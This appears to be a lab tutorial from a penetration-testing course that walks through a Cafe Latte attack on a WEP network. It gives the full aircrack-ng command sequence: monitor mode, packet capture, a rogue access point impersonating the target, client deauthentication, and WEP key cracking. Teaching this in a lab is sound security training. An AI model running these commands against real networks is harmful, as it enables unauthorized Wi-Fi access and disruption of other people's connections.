#### Enabling Monitor Mode

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

```sh
3kjS@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```
#### Performing the Attack

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP
```

In a second terminal, we can start the `Cafe Latte` attack using `aireplay-ng`. We specify the Cafe Latte attack mode with `-6`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. This will listen for a station to connect, and replay any captured ARP requests to the client.

```sh
3kjS@htb[/htb]$ aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon
```

Once the Cafe Latte listener is running, the next step is to launch a fake access point in a third terminal. The ESSID and BSSID of this access point must match those of the target network to deceive deauthenticated clients into reconnecting and sharing their ARP requests.

The `airbase-ng` tool is used to create this fake access point, with identical BSSID and ESSID to the target, operating on the same channel. Use the `-a` flag to specify the BSSID of the target AP, `-e` to set the ESSID, `-c` to select the channel, `-L` to initiate the Cafe Latte attack mode, and `-W 1` to enable WEP mode.

```sh
3kjS@htb[/htb]$ airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "HackTheWifi" wlan0mon -W 1 -L

09:50:40  Created tap interface at0
09:50:40  Trying to set MTU on at0 to 1500
09:50:40  Trying to set MTU on wlan0mon to 1800
09:50:40  Access Point with BSSID B2:D1:AC:E1:21:D1 started.
```

```sh
3kjS@htb[/htb]$ aireplay-ng -0 10 -a B2:D1:AC:E1:21:D1 -c B6:1F:98:CB:10:78 wlan0mon
```

When the target station is deauthenticated, we should see changes in our second and third terminal that are indicative of our attack succeeding.

```sh
3kjS@htb[/htb]$ airbase-ng -c 1 -a B2:D1:AC:E1:21:D1 -e "HackTheWifi" wlan0mon -W 1 -L
```

```sh
3kjS@htb[/htb]$ aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon
```

Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured initialization vectors (IVs) stored in the WEP-01.cap file.

```sh
3kjS@htb[/htb]$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap
```

**Note**: `While executing the Cafe Latte attack, if no ARP packets are generated, it is recommended to rerun the deauthentication attack using "aireplay-ng" then immediately execute the "airbase-ng" command.`
